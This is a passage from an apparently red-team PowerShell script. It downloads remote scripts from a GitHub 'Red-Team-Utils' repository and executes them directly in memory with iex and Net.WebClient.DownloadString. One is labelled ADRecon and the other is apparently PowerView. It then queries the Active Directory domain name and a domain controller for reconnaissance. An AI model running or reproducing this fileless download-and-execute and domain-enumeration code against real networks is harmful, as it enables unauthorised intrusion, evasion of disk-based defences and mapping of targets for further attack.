...
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ReSOC-Operator/Red-Team-Utils/refs/heads/main/pwvw.ps1')

# download adrecon into memory
Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ReSOC-Operator/Red-Team-Utils/refs/heads/main/adr.ps1')

# print out domain context
$domain = Get-NetDomain |
    Select-Object -ExpandProperty Name

$dcServer = Get-NetDomainController |
    Select-Object -First 1 -ExpandProperty Name

$dcServer = [string]$dcServer
